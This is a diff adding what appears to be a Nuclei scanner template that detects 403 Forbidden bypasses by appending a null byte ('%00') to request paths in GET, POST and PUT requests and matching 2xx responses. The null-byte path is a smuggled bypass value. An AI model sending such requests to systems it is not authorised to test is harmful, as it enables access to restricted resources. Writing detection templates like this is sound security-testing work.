@@ -1,0 +1,30 @@
+id: 403-bypass-using-nullbyte
+
+info:
+  name: 403 Forbidden Bypass Detection
+  author: Dr4g0n
+  severity: medium
+  description: |
+    Detects potential 403 Forbidden bypass vulnerabilities by using nullbyte.
+
+http:
+  - raw:
+      - |
+        GET {{Path}}%00 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST {{Path}}%00 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        PUT {{Path}}%00 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code >= 200"
+          - "status_code < 300"
+          - "!contains(body, '<title>Request Rejected</title>')"
+        condition: and
